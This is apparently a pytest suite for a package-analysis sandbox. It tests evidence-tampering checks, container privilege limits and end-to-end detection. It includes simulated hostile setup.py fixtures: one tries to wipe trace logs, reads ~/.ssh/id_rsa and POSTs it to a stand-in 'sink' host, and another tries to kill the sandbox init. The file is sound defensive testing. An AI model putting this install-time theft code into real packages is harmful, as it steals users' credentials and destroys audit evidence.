"""Evidence isolation and the privilege design of the sandbox.

Design under test: a package container with no root and no capabilities, plus a network-less tracer sidecar (root,
SYS_PTRACE only) that shares its PID namespace and keeps the trace in a mount namespace the package cannot see.
Sandbox tests need Docker and `scripts/up.sh`; unit tests do not."""
import hashlib
import json
import subprocess
import sys
import urllib.request

import pytest

from shadowrun import canary, config, doctor, monitor, pipeline, policy, sandbox
from shadowrun.sdist_tool import make_sdist

SANDBOX_UP = False
try:
    urllib.request.urlopen(config.PYPI_URL + "/", timeout=2)
    import docker
    docker.from_env().containers.get("sink")
    SANDBOX_UP = True
except Exception:
    pass
needs_sandbox = pytest.mark.skipif(not SANDBOX_UP, reason="sandbox services not up")


# ------------------------------------------------------------------ unit: evidence verification logic

class FakeContainer:
    """Stands in for a docker container; `exec_run` answers from a script of (matcher -> output)."""

    def __init__(self, stat="0 0 600 regular file", size=None, sha=None, rc="0", blob=b"7 1.0 execve(...) = 0\n",
                 done=True, status="running", fail=None):
        self.status = status
        self.blob, self.done, self.fail = blob, done, fail
        self.stat = stat
        self.size = len(blob) if size is None else size
        self.sha = hashlib.sha256(blob).hexdigest() if sha is None else sha
        self.rc = rc

    def reload(self):
        if self.fail == "reload":
            raise RuntimeError("daemon gone")

    def exec_run(self, cmd, user=None, demux=False):
        class R:
            pass
        r = R()
        if cmd[:2] == ["test", "-f"]:
            r.exit_code, r.output = (0 if self.done else 1), b""
        elif cmd[0] == "sh":
            if self.fail == "stat":
                r.exit_code, r.output = 1, b""
            else:
                out = f"{self.stat}\n{self.size}\n{self.sha}  /trace/trace.log\n{self.rc}\n"
                r.exit_code, r.output = 0, out.encode()
        elif cmd[0] == "cat":
            r.exit_code, r.output = (1, b"") if self.fail == "cat" else (0, self.blob)
        else:  # pragma: no cover
            raise AssertionError(cmd)
        return r


def test_good_evidence_is_trusted():
    ev = sandbox.collect_evidence(FakeContainer(), timed_out=False)
    assert ev.trusted and ev.done and ev.strace_rc == 0 and ev.trace_text.startswith("7 1.0") and ev.size == len(ev.trace_text)


@pytest.mark.parametrize("stat", ["1000 1000 600 regular file", "0 0 644 regular file", "0 0 600 symbolic link",
                                  "0 1000 600 regular file", "0 0 777 regular file"])
def test_changed_ownership_mode_or_type_is_tampering(stat):
    ev = sandbox.collect_evidence(FakeContainer(stat=stat), timed_out=False)
    assert ev.tampered and not ev.trusted


def test_hash_or_size_mismatch_is_tampering():
    assert sandbox.collect_evidence(FakeContainer(sha="0" * 64), False).tampered
    assert sandbox.collect_evidence(FakeContainer(size=999), False).tampered


@pytest.mark.parametrize("kwargs", [dict(fail="stat"), dict(fail="cat"), dict(fail="reload"), dict(status="exited"),
                                    dict(done=False)])
def test_collection_failures_are_errors_not_passes(kwargs):
    ev = sandbox.collect_evidence(FakeContainer(**kwargs), timed_out=False)
    assert ev.errors and not ev.trusted


def test_unfinished_wrapper_after_timeout_is_not_an_error_but_trace_is_still_partial():
    ev = sandbox.collect_evidence(FakeContainer(done=False), timed_out=True)
    assert ev.trusted and not ev.done  # partial trace; completeness (completion marker) is judged by the parser


def test_oversize_trace_is_refused_not_truncated():
    ev = sandbox.collect_evidence(FakeContainer(size=sandbox.MAX_TRACE_BYTES + 1), False)
    assert any("larger" in e for e in ev.errors) and ev.trace_text == ""


def test_evidence_failures_map_to_denied_verdicts():
    from shadowrun.detector import DetectorConfig, RunContext, analyze
    cfg = DetectorConfig.from_policy()
    tamper = sandbox.collect_evidence(FakeContainer(stat="1000 1000 600 regular file"), False)
    f = analyze([], RunContext(canary_paths=[], evidence_tampered=tamper.tampered, evidence_errors=tamper.errors,
                               trace_problems=[]), cfg)
    assert policy.decide(f).decision == "BLOCK"
    fail = sandbox.collect_evidence(FakeContainer(fail="cat"), False)
    f = analyze([], RunContext(canary_paths=[], evidence_errors=fail.errors, trace_problems=[]), cfg)
    d = policy.decide(f)
    assert d.decision == "ESCALATE" and d.indeterminate


# ------------------------------------------------------------------ the privilege design, asserted

def test_scripts_contain_no_privilege_switching():
    for script in (sandbox.PACKAGE_INIT, sandbox.TRACER_SCRIPT):
        assert "setpriv" not in script and "setuid" not in script.lower() and "su " not in script
    assert "-p 1" in sandbox.TRACER_SCRIPT and "-o /trace/trace.log" in sandbox.TRACER_SCRIPT
    assert "/ctl/go" in sandbox.PACKAGE_INIT and sandbox.PACKAGE_INIT.rstrip().endswith("exec cat")


class SpyClient:
    """Wraps the real docker client and records the arguments of every containers.run call."""

    def __init__(self, real):
        self._real, self.calls = real, []
        outer = self

        class Containers:
            def run(self, image, command=None, **kw):
                outer.calls.append({"image": image, "command": command, **kw})
                return outer._real.containers.run(image, command, **kw)

            def __getattr__(self, name):
                return getattr(outer._real.containers, name)
        self.containers = Containers()

    def __getattr__(self, name):
        return getattr(self._real, name)


@needs_sandbox
def test_container_privileges_are_what_the_design_says(monkeypatch):
    spy = SpyClient(sandbox.client())
    monkeypatch.setattr(sandbox, "client", lambda: spy)
    cs = canary.create_home("test-privs")
    try:
        sandbox.run_analysis("true", home=cs.home, timeout=30)
    finally:
        canary.cleanup_home(cs)
    pkg, tracer = spy.calls
    # package container: unprivileged, zero capabilities, on the internal network, pid namespace of its own
    assert pkg["user"] == f"{config.UID}:{config.GID}" and config.UID != 0
    assert pkg["cap_drop"] == ["ALL"] and not pkg.get("cap_add")
    assert pkg["security_opt"] == ["no-new-privileges:true"] and pkg["read_only"] is True
    assert pkg["network"] == config.NETWORK and "pid_mode" not in pkg and not pkg.get("privileged")
    assert "/trace" not in pkg["tmpfs"] and all(v["bind"] != "/trace" for v in pkg["volumes"].values())
    assert pkg["volumes"][next(k for k, v in pkg["volumes"].items() if v["bind"] == "/ctl")]["mode"] == "ro"
    # tracer sidecar: root, ONLY SYS_PTRACE, no network, no host mounts, shares the package PID namespace
    assert tracer["user"] == "0:0" and tracer["cap_drop"] == ["ALL"] and tracer["cap_add"] == ["SYS_PTRACE"]
    assert tracer["network_mode"] == "none" and "network" not in tracer
    assert tracer["pid_mode"].startswith("container:") and tracer["read_only"] is True
    assert not tracer.get("volumes") and not tracer.get("privileged")
    assert "/trace" in tracer["tmpfs"] and "mode=0700" in tracer["tmpfs"]["/trace"] and "uid=0" in tracer["tmpfs"]["/trace"]


# ------------------------------------------------------------------ sandbox: real containers

@needs_sandbox
def test_package_cannot_see_or_touch_the_trace_or_the_tracer():
    cs = canary.create_home("test-tamper")
    try:
        probe = doctor.ISOLATION_PROBE + (
            "\nfor a in 'echo x >> /trace/trace.log' 'rm /trace/trace.log' 'ls /trace' 'touch /trace/forged'; do "
            "sh -c \"$a\" >/dev/null 2>&1 && echo SUCCEEDED:$a || echo BLOCKED:attack; done\n")
        res, ev = sandbox.run_analysis(probe, home=cs.home, timeout=40)
    finally:
        canary.cleanup_home(cs)
    assert "SUCCEEDED" not in res.logs, res.logs
    assert f"UID:{config.UID}" in res.logs
    assert "CapEff:0000000000000000" in res.logs and "CapBnd:0000000000000000" in res.logs and "NoNewPrivs:1" in res.logs
    assert "BLOCKED:trace-dir-not-visible" in res.logs and res.logs.count("BLOCKED:attack") == 4
    assert "ROOTPROCS:0" not in res.logs  # the tracer's root processes were visible, and every attack on them failed
    assert ev.trusted and ev.done


@needs_sandbox
def test_sandbox_time_is_broken_down_by_stage():
    cs = canary.create_home("test-phases")
    try:
        res, ev = sandbox.run_analysis("true", home=cs.home, timeout=40)
    finally:
        canary.cleanup_home(cs)
    expect = {"package_container_ms", "tracer_container_ms", "attach_ms", "traced_run_ms", "stop_tracer_ms", "collect_ms"}
    assert expect <= set(res.phases) and all(v >= 0 for v in res.phases.values())


@needs_sandbox
def test_package_runs_unprivileged_and_the_exit_status_is_reported():
    cs = canary.create_home("test-uid")
    try:
        res, ev = sandbox.run_analysis("id -u; id -g; exit 3", home=cs.home, timeout=40)
    finally:
        canary.cleanup_home(cs)
    lines = res.logs.split()
    assert lines[0] == str(config.UID) and lines[1] == str(config.GID)
    assert res.exit_code == 3 and ev.trusted


@needs_sandbox
def test_tracer_failure_means_unavailable_evidence_and_the_package_never_runs(monkeypatch):
    monkeypatch.setattr(sandbox, "TRACER_SCRIPT", "strace --definitely-not-a-flag -p 1; sleep 30")
    cs = canary.create_home("test-nostrace")
    try:
        res, ev = sandbox.run_analysis("echo package-ran", home=cs.home, timeout=40)
    finally:
        canary.cleanup_home(cs)
    assert not ev.trusted and ev.errors
    assert "package-ran" not in res.logs  # the init waits for the go file, which is only written after attach


@needs_sandbox
def test_timeout_yields_partial_but_flagged_evidence():
    cs = canary.create_home("test-timeout")
    try:
        res, ev = sandbox.run_analysis("sleep 60", home=cs.home, timeout=3)
    finally:
        canary.cleanup_home(cs)
    pr = monitor.parse_trace(ev.trace_text, final_exec=sandbox.FINAL_EXEC)
    assert res.timed_out
    assert pr.completeness_problems()  # the completion marker never appeared: cannot be treated as complete


@needs_sandbox
def test_a_package_that_tries_to_kill_the_sandbox_init_is_blocked(tmp_path, monkeypatch):
    """Signals from inside a PID namespace cannot kill its init, so the attack fails; the ATTEMPT is the finding."""
    monkeypatch.setattr(config, "DB_PATH", tmp_path / "k.db")
    dist = config.ROOT / "packages" / "dist"
    killer = make_sdist("init-killer", "1.0.0", {"setup.py": (
        "# SIMULATED TEST FIXTURE. INERT OUTSIDE THE SHADOW-RUN SANDBOX.\n"
        "import os, signal\nfrom setuptools import setup\n"
        "try:\n    os.kill(1, signal.SIGKILL)\nexcept Exception:\n    pass\n"
        "setup(name='init-killer', version='1.0.0', description='SIMULATED TEST FIXTURE', py_modules=[])\n")}, dist, "SIMULATED")
    try:
        run = pipeline.run_action("init-killer")
    finally:
        killer.unlink(missing_ok=True)
    rules = {f["rule_id"] for f in run["findings"]}
    assert run["decision"] == "BLOCK" and "EVASION_SYSCALL" in rules
    assert "INCOMPLETE_TRACE" not in rules and "EVIDENCE_UNAVAILABLE" not in rules  # the init survived; trace complete


# ------------------------------------------------------------------ end to end with a hostile package

HOSTILE_SETUP = '''# SIMULATED TEST FIXTURE. INERT OUTSIDE THE SHADOW-RUN SANDBOX.
import os
import urllib.request
from setuptools import setup

for victim in ("/trace/trace.log", "/out/trace.log"):
    for action in ("truncate", "delete"):
        try:
            if action == "truncate":
                open(victim, "w").close()
            else:
                os.remove(victim)
        except Exception:
            pass
try:
    data = open(os.path.expanduser("~/.ssh/id_rsa"), "rb").read()
    urllib.request.urlopen(urllib.request.Request("http://sink:9000/collect", data=data, method="POST"), timeout=3)
except Exception:
    pass

setup(name="trace-wiper", version="1.0.0", description="SIMULATED TEST FIXTURE", py_modules=[])
'''


@pytest.fixture
def hostile_pkg(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "DB_PATH", tmp_path / "e.db")
    dist = config.ROOT / "packages" / "dist"
    f = make_sdist("trace-wiper", "1.0.0", {"setup.py": HOSTILE_SETUP}, dist, "SIMULATED")
    yield "trace-wiper"
    f.unlink(missing_ok=True)


@needs_sandbox
def test_package_that_tries_to_wipe_its_trace_is_still_blocked_with_intact_evidence(hostile_pkg):
    run = pipeline.run_action(hostile_pkg)
    rules = {f["rule_id"] for f in run["findings"]}
    assert run["error"] is None, run
    assert run["decision"] == "BLOCK"
    assert {"CANARY_READ", "NET_OUTBOUND", "CANARY_EXFIL"} <= rules
    assert "EVIDENCE_TAMPERED" not in rules and "INCOMPLETE_TRACE" not in rules
    report = json.loads(run["report_json"])
    assert report["evidence"]["trusted"] and report["evidence"]["sha256"] and report["trace_problems"] == []
    saved = (config.TRACE_DIR / run["id"] / "trace.log").read_text()
    assert "/trace/trace.log" in saved and "ENOENT" in saved  # the wipe attempts are in the evidence, and failed
    assert report["doctor"]["id"]


@needs_sandbox
def test_pipeline_with_failed_tracer_is_indeterminate_and_denied(monkeypatch, tmp_path):
    monkeypatch.setattr(config, "DB_PATH", tmp_path / "e2.db")
    subprocess.check_call([sys.executable, str(config.ROOT / "packages" / "build_all.py")], stdout=subprocess.DEVNULL)
    monkeypatch.setattr(sandbox, "TRACER_SCRIPT", "strace --definitely-not-a-flag -p 1; sleep 30")
    run = pipeline.run_action("csvtoolkit")
    assert run["decision"] == "ESCALATE" and run["decision_obj"].indeterminate
    assert "EVIDENCE_UNAVAILABLE" in {f["rule_id"] for f in run["findings"]}
    assert run["findings"] and "csvtoolkit" == run["package_name"]


@needs_sandbox
def test_parser_crash_is_denied_not_allowed(monkeypatch, tmp_path):
    from shadowrun import health
    monkeypatch.setattr(config, "DB_PATH", tmp_path / "e3.db")
    subprocess.check_call([sys.executable, str(config.ROOT / "packages" / "build_all.py")], stdout=subprocess.DEVNULL)
    health.ensure_pass(force=True)  # the doctor itself uses the parser: pass the gate BEFORE breaking it

    def boom(text, *a, **kw):
        raise RuntimeError("parser exploded")
    monkeypatch.setattr(pipeline.monitor, "parse_trace", boom)
    run = pipeline.run_action("csvtoolkit")
    assert run["decision"] == "ESCALATE" and run["decision_obj"].indeterminate and "parser exploded" in run["error"]


@needs_sandbox
def test_doctor_isolation_and_coverage_checks_pass_on_this_machine():
    ok1, d1 = doctor.check_evidence_isolation()
    ok2, d2 = doctor.check_syscall_coverage()
    assert ok1, d1
    assert ok2, d2
